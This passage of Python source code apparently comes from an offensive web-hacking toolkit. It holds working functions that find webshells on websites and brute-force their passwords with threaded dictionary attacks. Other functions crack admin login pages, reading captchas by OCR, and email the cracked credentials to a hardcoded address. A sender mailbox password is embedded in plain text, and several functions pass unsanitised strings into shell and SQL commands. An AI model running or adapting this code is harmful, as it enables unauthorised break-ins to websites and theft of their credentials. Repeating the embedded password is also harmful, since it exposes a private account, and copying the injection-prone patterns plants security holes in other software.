        "^((?:(2[0-4]\d)|(25[0-5])|([01]?\d\d?))\.){3}(?:(2[0-4]\d)|(255[0-5])|([01]?\d\d?))$")
    if re.match(p, string):
        return True
    else:
        return False


def update_file_key_value(file, key_name, sep, key_value):
    # 更新文件中的关键字的值
    # key_name中没有单双引号
    # sep为=或:
    if sep not in ['=', ':']:
        print("you separator is not = or :,this function is not suitable")
        return
    else:
        if os.path.exists(file):
            # sed加-r可以直接用()等特殊字符表示regxp,否则()在表示正则中的意义时等要写成\(\)
            # sed中如果有双引号可以用#替代/,这样就没有双引号不能用的问题了,要不然sed中不能用双引号
            if type(key_value) == type("this is a str type"):
                sed_string = '''sed -r -i 's#%s[^\s]+#%s"%s"#g' %s''' % (
                    key_name + sep, key_name + sep, key_value, file)
                print(sed_string)
                os.system(sed_string)
            if type(key_value) == type(1):
                sed_string = "sed -r -i 's/%s[^\s]+/%s%s/g' %s" % (
                    key_name + sep, key_name + sep, str(key_value), file)
                print(sed_string)
                os.system(sed_string)
            else:
                sed_string = "sed -r -i 's#%s[^\s]+#%s%s#g' %s" % (
                    key_name + sep, key_name + sep, str(key_value), file)
                print(sed_string)
                os.system(sed_string)
        else:
            print("file not exists")
            return


def update_config_file_key_value(file, section, key_name, key_value):
    # 通过configparser模块的调用更新配置文件
    # section是[]里面的值
    import configparser
    config = configparser.ConfigParser()
    config.read(file)
    sectionList = config.sections()
    if section not in sectionList:
        config.add_section(section)
    config.set(section, key_name, str(key_value))
    with open(file, 'w') as f:
        config.write(f)


def get_key_value_from_config_file(file, section, key_name):
    import configparser
    config = configparser.ConfigParser()
    config.read(file)
    value = config.get(section, key_name)
    return value


def get_key_value_from_file(key, separator, file_abs_path):
    # 从文件中获取指定关键字的值,第一个参数为关键字,第二个参数为分隔符,第三个参数为文件绝对路径
    # 默认设置分隔符为":"和"="和" "和"    ",如果使用默认分隔符需要将第二个参数设置为'',也即无字符
    # 如果不使用默认分隔符,需要设置第二个参数为string类型如"="
    # 如果不存在对应的关键字则返回0
    separators = []
    if separator == '':
        separators = ['=', ':', ' ', '    ']
    else:
        separators.append(separator)

    f = open(file_abs_path, "r+")
    all = f.readlines()
    f.close()
    for each in all:
        each = re.sub(r'(\s)', "", each)
        for sep in separators:
            find1 = re.search(r"%s%s'(.*)'" % (key, sep), each)
            if find1:
                return find1.group(1)
            find2 = re.search(r'''%s%s"(.*)"''' % (key, sep), each)
            if find2:
                return find2.group(1)
            find3 = re.search(r'''%s%s([^'"]*)''' % (key, sep), each)
            if find3:
                return find3.group(1)

    return 0


def execute_sql_in_db(sql, db_name="mysql"):
    # 执行数据库命令
    # 返回值为fetchone()的返回值
    try:
        import MySQLdb
    except:
        # for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip install MySQLdb")
        import MySQLdb

    try:
        conn = MySQLdb.connect(
            eval(get_key_value_from_config_file('config.ini','default','db_server')),
            eval(get_key_value_from_config_file('config.ini','default','db_user')),
            eval(get_key_value_from_config_file('config.ini','default','db_pass')),
            db=db_name,
            port=3306,
            charset="utf8")
        conn.autocommit(1)
        cur = conn.cursor()
        cur.execute('SET NAMES utf8')

        print("sql is:")
        print(sql)
        cur.execute(sql)
        result = cur.fetchall()
        print("result is:")
        print(result)

        return result
    except:
        import traceback
        traceback.print_exc()
        # 发生错误回滚
        conn.rollback()
    finally:
        cur.close()
        conn.close()


def write_string_to_sql(
        string,
        db_name,
        table_name,
        column_name,
        table_primary_key,
        table_primary_key_value):
    # eg.write_string_to_sql("lll","h4cktool","targets","scan_result","http_domain","https://www.baidu.com")
    # eg.write_string_to_sql(1,"h4cktool","urls","cracked_admin_login_url","url",current_url)
    # 将string写入数据库
    # argv[1]:要写入的string
    # argv[2]:操作的数据库名
    # argv[3]:操作的表名
    # argv[4]:操作的列名
    # argv[5]:表的主键,默认为''(空)
    # argv[6]:表的主键值,默认为''(空)
    string = str(string)
    try:
        import MySQLdb
    except:
        # for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip install MySQLdb")
        import MySQLdb

    try:
        conn = MySQLdb.connect(
            eval(get_key_value_from_config_file('config.ini','default','db_server')),
            eval(get_key_value_from_config_file('config.ini','default','db_user')),
            eval(get_key_value_from_config_file('config.ini','default','db_pass')),
            db=eval(get_key_value_from_config_file('config.ini','default','db_name')),
            port=3306,
            charset="utf8")
        conn.autocommit(1)
        cur = conn.cursor()
        cur.execute('SET NAMES utf8')
        sql0 = "select * from %s where %s='%s'" % \
            (table_name, table_primary_key, MySQLdb.escape_string(table_primary_key_value))
        # print(sql0)
        cur.execute(sql0)
        result = cur.fetchone()
        if result is None:
            # print "this http_domain not exist,I will create a new record"
            # eg.
            # INSERT INTO targets(http_domain) VALUES('http://1234');
            # or
            # INSERT INTO targets (http_domain) VALUES ('http://1234');
            insert_new_http_domain = "replace into %s(%s) values('%s')" % (
                table_name, table_primary_key, MySQLdb.escape_string(str(table_primary_key_value)))
            cur.execute(insert_new_http_domain)
            # insert动作要commit,select的查询动作不用commit,execute就可以得到结果,可以最后再commit
            # conn.commit()
            strings_to_write = string
        else:
            # dec is a key word in mysql,so we should add `` here
            sql1 = "select %s from %s where %s='%s'" % (
                column_name, table_name, table_primary_key, MySQLdb.escape_string(table_primary_key_value))
            # print sql1
            cur.execute(sql1)
            data = cur.fetchone()
            if data[0] == '':
                strings_to_write = string
            else:
                strings_to_write = data[0] + '\r\n' + string

        if ((table_name == eval(get_key_value_from_config_file('config.ini','default','targets_table_name')) or table_name == eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name')) or
             table_name[-5:] == "_pang") and column_name == "http_domain") or (table_name[-5:] == "_urls"
                                                                               and column_name == "url"):
            pass
        else:
            sql2 = "update %s set %s='%s' where %s='%s'" % \
                (table_name, column_name, MySQLdb.escape_string(strings_to_write), table_primary_key,
                 MySQLdb.escape_string(table_primary_key_value))
            # print sql2
            cur.execute(sql2)
            # print sql2
            conn.commit()
        '''
        # sql0="replace into %s(%s) values('%s') on duplicate key update %s=%s+'%s'" % \
                (table_name,table_primary_key,table_primary_key_value,column_name,column_name,\
                MySQLdb.escape_string(string))
        # cur.execute(sql0)
        '''

    except:
        import traceback
        traceback.print_exc()
        # 发生错误回滚
        conn.rollback()
    finally:
        cur.close()
        conn.close()


def auto_write_string_to_sql(
        string,
        db_name,
        table_name,
        column_name,
        table_primary_key,
        table_primary_key_value):
    # 自动写内容到数据库中,相比write_string_to_sql函数多了其他相关写内容到数据库的动作
    # 会在将一个column内容写到数据库时将其他的与之相关的可以确定的其他column中的可以填
    # 写的数据填入数据库,eg.targets表中填写http_domain时顺便填写domain
    # eg.urls表中填写url时顺便填写urls表中的http_domain
    # 只多写相同表中的可写的column,不同表中的可写column暂时不写
    try:
        import MySQLdb
    except:
        # for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip install MySQLdb")
        import MySQLdb
    # 首先将该写的写进去,下面会再看看有没有其他可写的column
    write_string_to_sql(
        string,
        db_name,
        table_name,
        column_name,
        table_primary_key,
        table_primary_key_value)

    if (table_name == eval(get_key_value_from_config_file('config.ini','default','targets_table_name')) or table_name ==
            eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name'))) and column_name != "domain":

        domain_column_has_content = False
        try:
            conn = MySQLdb.connect(
                eval(get_key_value_from_config_file('config.ini','default','db_server')),
                eval(get_key_value_from_config_file('config.ini','default','db_user')),
                eval(get_key_value_from_config_file('config.ini','default','db_pass')),
                db=eval(get_key_value_from_config_file('config.ini','default','db_name')),
                port=3306,
                charset="utf8")
            conn.autocommit(1)
            cur = conn.cursor()
            sql0 = "select domain from %s where http_domain='%s'" % \
                (table_name, MySQLdb.escape_string(table_primary_key_value))
            cur.execute(sql0)
            # result是一个元组,查询的结果在result[0]里面,result[0]是个u"" unicode
            # string类型,如果查询内容为空则
            result = cur.fetchone()
            if result is None or result[0] == '':
                # 如果domain内容为空才写,否则说明已经写过了就不再写入了
                domain_column_has_content = False
            else:
                domain_column_has_content = True
        except:
            import traceback
            traceback.print_exc()
            conn.rollback()
        finally:
            cur.close()
            conn.close()
        # 此时table_primary_key是http_domain,eg.http://www.baidu.com形式
        if not domain_column_has_content:
            write_string_to_sql(table_primary_key_value.split(
                "//")[-1], db_name, table_name, "domain", table_primary_key, table_primary_key_value)

    if table_name[-5:] == "_urls" and column_name != "http_domain":
        # 在写信息到数据库的urls表中时,把http_domain列顺便写进去
        http_domain_column_has_content = False
        try:
            conn = MySQLdb.connect(
                eval(get_key_value_from_config_file('config.ini','default','db_server')),
                eval(get_key_value_from_config_file('config.ini','default','db_user')),
                eval(get_key_value_from_config_file('config.ini','default','db_pass')),
                db=eval(get_key_value_from_config_file('config.ini','default','db_name')),
                port=3306,
                charset="utf8")
            conn.autocommit(1)
            cur = conn.cursor()
            sql1 = "select http_domain from %s where url='%s'" % \
                (table_name, MySQLdb.escape_string(table_primary_key_value))
            cur.execute(sql1)
            result = cur.fetchone()
            if result is None or result[0] == '':
                http_domain_column_has_content = False
            else:
                http_domain_column_has_content = True
        except:
            import traceback
            traceback.print_exc()
            conn.rollback()
        finally:
            cur.close()
            conn.close()
        # 此时的table_primary_key是"url"
        if not http_domain_column_has_content:
            write_string_to_sql(
                get_http_domain_from_url(table_primary_key_value),
                db_name,
                table_name,
                "http_domain",
                table_primary_key,
                table_primary_key_value)


def get_http_domain_pattern_from_url(url):
    # eg.从http://www.baidu.com/1/2.php中得到http://www.baidu.com的正则匹配类型
    # 也即将其中的.替换成\.
    http_domain = get_http_domain_from_url(url)
    '''
    split_string=http_domain.split(".")
    part_num=len(split_string)
    new_http_domain=""
    for i in range(part_num):
        new_http_domain+=(split_string[i]+"\.")
    new_http_domain=new_http_domain[:-2]
    return new_http_domain
    '''
    # 正则1句代码话顶6句代码
    return_value = re.sub(r'\.', '\.', http_domain)
    return return_value


def check_webshell_url(url):
    # 检测url是否为webshell,并检测是webshell需要用html中搜索到的表单爆破还是用一句话类型爆破方式爆破
    # 返回结果为一个字典,有3个键值对
    # 第一个键为是否是webshell,用y1表示,y1为True或者False
    # 第二个键为webshell爆破方式,用y2表示
    # y2的值可能是
    # 1>"biaodan_bao"(根据搜到的表单爆)
    # 2>"direct_bao"(直接爆)
    # 3>""(空字符串,对应url不是webshell)
    # 4>"bypass"(对应url是一个webshll,且该webshell不用输入密码即可控制)
    # 第三个键为在http_get请求url所得的三个关键元素:code,title,content
    # y3的值是一个字典{"code":code,"title":title,"content":content}   其中code的类型为str

    y1 = False
    belong2github = False
    y2 = ""

    response_dict = get_response_key_value_from_url(url)
    code = response_dict['code']
    title = response_dict['title']
    # python3中得到的html为bytes类型,在get_request函数中已经content.decode("utf8")了
    content = response_dict['content']

    # 过滤掉github.com里面的文件
    parsed = urlparse(url)
    pattern = re.compile(r"github.com")
    if re.search(pattern, parsed.netloc):
        belong2github = True

    # 根据url中的文件名检测url是否为webshell
    strange_filename_pattern = re.compile(
        r"^(http).*(((\d){3,})|(/c99)|((\w){10,})|([A-Za-z]{1,5}[0-9]{1,5})|([0-9]{1,5}[A-Za-z]{1,5})|(/x)|(/css)|(/licen{0,1}se(1|2){0,1}s{0,1})|(hack)|(fuck)|(h4ck)|(/diy)|(/wei)|(/2006)|(/newasp)|(/myup)|(/log)|(/404)|(/phpspy)|(/b374k)|(/80sec)|(/90sec)|(/r57)|(/b4che10r)|(X14ob-Sh3ll)|(aspxspy)|(server_sync))\.((php(3|4|5){0,1})|(phtml)|(asp)|(asa)|(cer)|(cdx)|(aspx)|(ashx)|(asmx)|(ascx)|(jsp)|(jspx)|(jspf))$",
        re.I)
    if re.match(
            strange_filename_pattern,
            url) and belong2github == False and len(content) < 8000:
        y1 = True

    # 根据title检测url是否为webshell
    strange_title_pattern = re.compile(
        r".*((shell)|(b374k)|(sec)|(sh3ll)|(blood)|(r57)|(BOFF)|(spy)|(hack)|(h4ck)).*",
        re.I)
    if title is not None and code == 200:
        if re.search(
                strange_title_pattern,
                title) and belong2github == False and len(content) < 8000:
            y1 = True

    if title is None and code == 200:
        # 如果title为None,说明有可能是webshell,或者是正常的配置文件
        if len(content) == 0:
            new_http_domain = get_http_domain_pattern_from_url(url)
            new_http_domain = new_http_domain[:-2]
            # print new_http_domain
            # 配置文件匹配方法
            not_webshell_pattern = re.compile(
                r"%s/(((database)|(data)|(include))/)?((config)|(conn))\.((asp)|(php)|(aspx)|(jsp))" %
                new_http_domain, re.I)
            if re.search(not_webshell_pattern, url):
                y1 = False
            else:
                y1 = True
                y2 = "direct_bao"

        caidao_jsp_pattern = re.compile(r"->\|\|<-")
        if 0 < len(content) < 50 and re.search(caidao_jsp_pattern, content):
            # jsp的菜刀一句话
            y1 = True
            y2 = "direct_bao"

    # 根据返回的html内容中是否有关键字以及返回内容大小判断是否为webshell
    strang_filecontent_pattern = re.compile(
        r".*((shell)|(hack)|(h4ck)|(b374k)|(c99)|(spy)|(80sec)|(hat)|(black)|(90sec)|(blood)|(r57)|(b4che10r)|(X14ob-Sh3ll)|(server_sync)).*",
        re.I)
    if re.search(strang_filecontent_pattern, content) and len(content) < 8000:
        y1 = True

    # 如果正常返回大小很小,说明有可能是一句话
    # 1.返回结果为200且文件内容少且有关键字的为大马
    # 2.返回结果为200且文件内容少且没有关键字的为一句话小马
    if y1 and 200 == code:
        webshell_flag = re.compile(r"(c:)|(/home)|(/var)|(/phpstudy)", re.I)
        if len(content) < 8000 and re.search(
                r'''method=('|")?post('|")?''', content):
            y2 = "biaodan_bao"
        if len(content) > 8000 and re.search(
                r'''method=('|")?post('|")?''',
                content) and re.search(
                webshell_flag,
                content):
            y2 = "bypass"

    # 如果返回码为404且返回内容大小较小但是返回结果中没有url中的文件名,判定为404伪装小马
    if 404 == code and len(content) < 600:
        url = re.sub(r"(\s)$", "", url)
        webshell_file_name = url.split("/")[-1]
        pattern = re.compile(r"%s" % webshell_file_name, re.I)
        if re.search(pattern, content):
            y1 = False
            y2 = ""
        else:
            if re.search(r'''method=('|")?post('|")?''', content) is None:
                y1 = True
                y2 = "direct_bao"
            else:
                y1 = True
                y2 = "biaodan_bao"

    return {
        'y1': y1,
        'y2': '%s' % y2,
        'y3': {
            "code": code,
            "title": title,
            "content": content}}


def get_webshell_suffix_type(url):
    # 获取url所在的webshell的真实后缀类型,结果为asp|php|aspx|jsp
    url = re.sub(r'(\s)$', "", url)
    parsed = urlparse(url)
    len1 = len(parsed.scheme)
    len2 = len(parsed.netloc)
    main_len = len1 + len2 + 3
    len3 = len(url) - main_len
    url = url[-len3:]

    # php pattern
    pattern = re.compile(r"\.((php)|(phtml)).*", re.I)
    if re.search(pattern, url):
        return "php"

    # asp pattern
    pattern1 = re.compile(r"\.asp.*", re.I)
    pattern2 = re.compile(r"\.aspx.*", re.I)
    if re.search(pattern1, url):
        if re.search(pattern2, url):
            return "aspx"
        else:
            return "asp"
    pattern = re.compile(r"\.((asa)|(cer)|(cdx)).*", re.I)
    if re.search(pattern, url):
        return "asp"

    # aspx pattern
    pattern = re.compile(r"\.((aspx)|(ashx)|(asmx)|(ascx)).*", re.I)
    if re.search(pattern, url):
        return "aspx"

    # jsp pattern
    pattern = re.compile(r"\.((jsp)|(jspx)|(jspf)).*", re.I)
    if re.search(pattern, url):
        return "jsp"


def get_http_domain_from_url(url):
    # eg.http://www.baidu.com/1/2/3.jsp==>http://www.baidu.com
    parsed = urlparse(url)
    http_domain_value = parsed.scheme + "://" + parsed.netloc
    # print http_domain_value
    return http_domain_value


def get_user_and_pass_form_from_html(html):
    # 从html内容(管理员登录的html)中获取所有的form表单
    # 返回结果为一个字典,包含2个键值对
    #"user_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    user_form_name = None
    pass_form_name = None
    user_pass_pattern = re.compile(
        r'''(<input .*type=('|")?text.*>)[\s\S]{,500}(<input .*type=('|")?password.*>)''',
        re.I)
    user_pattern = re.compile(r'''name=('|")?([^'" ]{,20})('|")?''', re.I)
    USER_PATTERN = re.compile(r'''(<input .*type=("|')?text("|')?.*>)''', re.I)
    pass_pattern = re.compile(r'''name=('|")?([^'" ]{,20})('|")?''', re.I)
    PASS_PATTERN = re.compile(
        r'''(<input .*type=("|')?password("|')?.*>)''', re.I)
    find_user_pass_form = re.search(user_pass_pattern, html)
    find_user_form = re.search(USER_PATTERN, html)
    find_pass_form = re.search(PASS_PATTERN, html)

    if find_user_pass_form and find_user_pass_form.group(1) is not None \
            and find_user_pass_form.group(3) is not None:
        # 既有user表单也有pass表单,标准的管理登录页面
        user_form_line = find_user_pass_form.group(1)
        user_form_name = re.search(user_pattern, user_form_line).group(2)
        pass_form_line = find_user_pass_form.group(3)
        pass_form_name = re.search(pass_pattern, pass_form_line).group(2)

    elif find_user_pass_form is None and find_user_form is not None:
        # 只有user表单
        user_form_line = find_user_form.group(1)
        tmp = re.search(user_pattern, user_form_line)
        if tmp is not None and tmp.group(2) is not None:
            user_form_name = tmp.group(2)
    elif find_user_pass_form is None and find_pass_form is not None:
        # 只有pass表单
        pass_form_line = find_pass_form.group(1)
        tmp = re.search(pass_pattern, pass_form_line)
        if tmp is not None and tmp.group(2) is not None:
            pass_form_name = tmp.group(2)

    return_value = {
        'user_form_name': user_form_name,
        'pass_form_name': pass_form_name}
    # print return_value
    return return_value


def get_user_and_pass_form_from_url(url):
    # 从url的get请求中获取所有form表单
    # 返回结果为一个字典,包含3个键值对
    #"user_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"response_key_value":value 这个value的值是一个字典,也即get_response_key_value_from_url函数的返回结果
    # 之所以要每次在有访问url结果的函数里面返回url访问结果,这样是为了可以只访问一次url,这样就可以一直将访问的返\
    # 回结果传递下去,不用多访问,效率更高
    url = re.sub(r'(\s)$', '', url)
    response_key_value = get_response_key_value_from_url(url)
    content = response_key_value['content']
    return_value = get_user_and_pass_form_from_html(content)
    return_value['response_key_value'] = response_key_value
    # print return_value
    return return_value


def get_yanzhengma_form_and_src_from_url(url):
    # 得到url对应的html中的验证码的表单名和验证码src地址
    parsed = urlparse(url)
    content = get_request(url)['content']
    yanzhengma_form_name = None
    yanzhengma_src = None
    # print content
    user_pass_pattern = re.compile(
        r'''<input .*name=('|")?([^'"]{,7}user[^'"]{,7}).*>[\s\S]{,500}<input .*name=('|")?([^'"]{,7}pass[^'"]{,7}).*>([\s\S]*)''',
        re.I)
    find_user_pass_form = re.search(user_pass_pattern, content)
    if find_user_pass_form and find_user_pass_form.group(2) is not None \
            and find_user_pass_form.group(4) is not None:
        # user和pass表单之后剩下的内容
        content_left = find_user_pass_form.group(5)
        yanzhengma_pattern = re.compile(
            r'''<input .*name=('|")?([^'" ]{,20})('|")?.*>''', re.I)
        yanzhengma_src_pattern = re.compile(
            r'''<img .*src=('|")?([^'" ]{,80})('|")?.*>''', re.I)
        find_yanzhengma = re.search(yanzhengma_pattern, content_left)
        find_yanzhengma_src = re.search(yanzhengma_src_pattern, content_left)
        if find_yanzhengma and find_yanzhengma_src:
            # 目前认为只有同时出现验证码和验证码src的html才是有验证码的,否则如"记住登录"的选项会被误认为是验证码
            yanzhengma_form_name = find_yanzhengma.group(2)
            # print yanzhengma_form_name
            if find_yanzhengma_src:
                yanzhengma_src = find_yanzhengma_src.group(2)
                # print yanzhengma_src
                if re.match(r"http.*", yanzhengma_src):
                    yanzhengma_src_url = yanzhengma_src
                else:
                    pure_url = parsed.scheme + "://" + parsed.netloc + parsed.path
                    yanzhengma_src_url = url[
                        :(len(pure_url) - len(pure_url.split("/")[-1]))] + yanzhengma_src
            return {
                'yanzhengma_form_name': yanzhengma_form_name,
                'yanzhengma_src': yanzhengma_src_url}
    return None


def crack_ext_direct_webshell_url(url, pass_dict_file, ext):
    # 爆破php|asp|aspx|jsp的一句话类型的webshell
    # 表单形式爆破的webshell爆破起来方法一样,不用分类
    # 一句话形式的webshell爆破需要根据后缀对应的脚本的语法的不同来爆破
    def ext_direct_webshell_crack_thread(xxx_todo_changeme):
        (password, url, ext) = xxx_todo_changeme
        if get_flag[0] == 1:
            return
        if ext in ["php", "asp", "aspx"]:
            pattern = re.compile(r"29289", re.I)
        if ext == "jsp":
            pattern = re.compile(r"->\|.+\|<-", re.I)

        if ext == "php":
            # php的echo 29289后面必须加分号
            values = {'%s' % password: 'echo 29289;'}
        elif ext == "asp":
            # asp后面不能加分号
            values = {'%s' % password: 'response.write("29289")'}
        elif ext == "aspx":
            # aspx后面可加可不加分号
            values = {'%s' % password: 'Response.Write("29289");'}
        elif ext == "jsp":
            # jsp一句话比较特殊,似乎没有直接执行命令的post参数
            # A后面没有分号
            # jsp一句话中:
            # A参数是打印当前webshell所在路径,post A参数返回内容如下
            #->|路径|<-  (eg.->|/home/llll/upload/custom |<-)
            # B参数是列目录
            # C参数是读文件
            # D,E,F,....参考jsp菜刀一句话服务端代码
            values = {'%s' % password: 'A'}

        data = urllib.parse.urlencode(values)
        try_time[0] += 1

        # post_request可处理表单post和无表单post,以及code=404的状况
        html = post_request(url, values)

        PASSWORD = "(" + password + ")" + (52 - len(password)) * " "
        sys.stdout.write('-' *
                         (try_time[0] //
                          (sum[0] //
                           100)) +
                         '>' +
                         str(try_time[0] //
                             (sum[0] //
                              100)) +
                         '%' +
                         ' %s/%s %s\r' %
                         (try_time[0], sum[0], PASSWORD))
        sys.stdout.flush()

        if re.search(pattern, html):
            get_flag[0] = 1
            end = time.time()
            # print "\b"*30
            # sys.stdout.flush()
            print(Fore.RED + "congratulations!!! webshell cracked succeed!!!")
            string = "cracked webshell:%s password:%s" % (url, password)
            return_password[0] = password
            print(Fore.RED + string)
            print("you spend time:" + str(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程

    def crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext):
        urls = []
        exts = []
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            exts.append(ext)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = i
        start[0] = time.time()

        # 这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成\
        # 功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可\
        # 参考下面文章
        # 后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        # http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        pool = ThreadPool(20)
        # 这里要用map,用map_async后面的pool.join()没有达到阻塞的效果,后来试了下又好像是Fore的问题,解决Fore的问\
        # 题后再换成map_async又可以了,后面的pool.join()又可以阻塞了
        results_list = pool.map_async(
            ext_direct_webshell_crack_thread, list(zip(passwords, urls, exts)))
        pool.close()
        pool.join()

    # 这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    # 且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]
    return_password = [""]

    crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext)
    return {'cracked': get_flag[0], 'password': return_password[0]}


def crack_admin_login_url(
        url,
        user_dict_file="dicts/user.txt",
        pass_dict_file="dicts/pass.txt"):
    # 爆破管理员后台登录url,尝试自动识别验证码,如果管理员登录页面没有验证码,加了任意验证码数据也可通过验证
    figlet2file("cracking admin login url", 0, True)
    print("cracking admin login url:%s" % url)
    print("正在使用吃奶的劲爆破登录页面...")

    def crack_admin_login_url_thread(xxx_todo_changeme1):
        (url, username, password) = xxx_todo_changeme1
        if get_flag[0] == 1:
            return

        if has_yanzhengma[0] == False:
            values = {
                '%s' %
                user_form_name: '%s' %
                username,
                '%s' %
                pass_form_name: '%s' %
                password}
        else:
            yanzhengma_form_name = get_yanzhengma_form_and_src_from_url(url)[
                'yanzhengma_form_name']
            yanzhengma_src = get_yanzhengma_form_and_src_from_url(url)[
                'yanzhengma_src']
            yanzhengma = get_string_from_url_or_picfile(yanzhengma_src)
            values = {
                '%s' %
                user_form_name: '%s' %
                username,
                '%s' %
                pass_form_name: '%s' %
                password,
                '%s' %
                yanzhengma_form_name: '%s' %
                yanzhengma}

        try_time[0] += 1
        html = post_request(url, values)
        USERNAME_PASSWORD = "(" + username + ":" + \
            password + ")" + (52 - len(password)) * " "
        # 每100次计算完成任务的平均速度
        left_time = get_remain_time(
            start[0],
            biaoji_time[0],
            remain_time[0],
            100,
            try_time[0],
            sum[0])
        remain_time[0] = left_time
        sys.stdout.write('-' * (try_time[0] // (sum[0] // 100)) + '>' + str(try_time[0] // (sum[0] // 100)) + '%' + ' %s/%s  \
                remain time:%s  %s\r' % (try_time[0], sum[0], remain_time[0], USERNAME_PASSWORD))
        sys.stdout.flush()

        if len(html) > logined_least_length:
            # 认为登录成功
            get_flag[0] = 1
            end = time.time()
            print(
                Fore.RED +
                "congratulations!!! admin login url cracked succeed!!!")
            string = "cracked admin login url:%s username and password:(%s:%s)" % (
                url, username, password)
            print(Fore.RED + string)
            print("you spend time:" + str(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            table_name_list = get_target_table_name_list(http_domain_value)
            urls_table_name = http_domain_value.split(
                "/")[-1].replace(".", "_") + "_urls"

            # 在爆破成功时将数据库中相应字段标记,并发送邮件
            # 在非urls表中将cracked_admin_login_urls_info字段添加新的爆破信息
            for each_table in table_name_list:
                auto_write_string_to_sql(
                    string,
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    each_table,
                    "cracked_admin_login_urls_info",
                    "http_domain",
                    http_domain_value)
            # 将urls表中cracked_admin_login_url_info字段标记为爆破结果信息
            execute_sql_in_db(
                "update %s set cracked_admin_login_url_info='%s' where url='%s'" %
                (urls_table_name, string, url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
            mail_msg_to(
                string,
                "2784046065@qq.com",
                "cracked webshell url",
                "18137062539@163.com",
                "063913ok")
            return {'username': username, 'password': password}

    def crack_admin_login_url_inside_func(url, username, pass_dict_file):
        # urls和usernames是相同内容的列表
        urls = []
        usernames = []
        # passwords是pass_dict_file文件对应的所有密码的集合的列表
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            usernames.append(username)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = usernames_num * i

        pool = ThreadPool(20)
        results_list = pool.map_async(
            crack_admin_login_url_thread, list(zip(urls, usernames, passwords)))
        pool.close()
        pool.join()
    # 用的时候导入Fore等模块,因为它们与tab_complete_for_file_path函数冲突
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    get_result = get_user_and_pass_form_from_url(url)
    user_form_name = get_result['user_form_name']
    pass_form_name = get_result['pass_form_name']
    # print user_form_name
    # print pass_form_name
    # raw_input()
    if user_form_name is None:
        print("user_form_name is None")
        return
    if pass_form_name is None:
        print("pass_form_name is None")
        return
    unlogin_length = len(get_result['response_key_value']['content'])
    # 如果post数据后返回数据长度超过未登录时的0.5倍则认为是登录成功
    logined_least_length = unlogin_length + unlogin_length / 2
    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]

    # 用来标记当前时间的"相对函数全局"变量
    biaoji_time = [0]
    # 用来标记当前剩余完成时间的"相对函数全局"变量
    tmp = time.time()
    remain_time = [tmp - tmp]
    # current_username_password={}

    has_yanzhengma = [False]
    find_yanzhengma = get_yanzhengma_form_and_src_from_url(url)
    if find_yanzhengma:
        yanzhengma_form_name = find_yanzhengma['yanzhengma_form_name']
        yanzhengma_src = find_yanzhengma['yanzhengma_src']
        has_yanzhengma = [True]

    with open(r"%s" % user_dict_file, "r+") as user_file:
        pool = ThreadPool(20)
        all_users = user_file.readlines()
        usernames_num = len(all_users)
        start[0] = time.time()
        for username in all_users:
            # 双层多线程,这里是username开多线程爆破
            username = re.sub(r'(\s)$', '', username)
            pool.apply_async(crack_admin_login_url_inside_func,
                             (url, username, pass_dict_file))
        pool.close()
        pool.join()
    return get_flag[0]


def crack_allext_biaodan_webshell_url(url, user_dict_file, pass_dict_file):
    # 爆破表单类型的webshell
    # 表单类型的webshell爆破方法一样,不用分不同脚本类型分别爆破
    def allext_biaodan_webshell_crack_thread(xxx_todo_changeme2):
        (password, url) = xxx_todo_changeme2
        if get_flag[0] == 1:
            return
        pattern = re.compile(
            r".*((/home)|(c:)|(/phpstudy)|(/var)|(wamp)).*", re.I)
        values = {'%s' % pass_form_name: '%s' % password}
        try_time[0] += 1
        html = post_request(url, values)

        PASSWORD = "(" + password + ")" + (52 - len(password)) * " "
        sys.stdout.write('-' *
                         (try_time[0] //
                          (sum[0] //
                           100)) +
                         '>' +
                         str(try_time[0] //
                             (sum[0] //
                              100)) +
                         '%' +
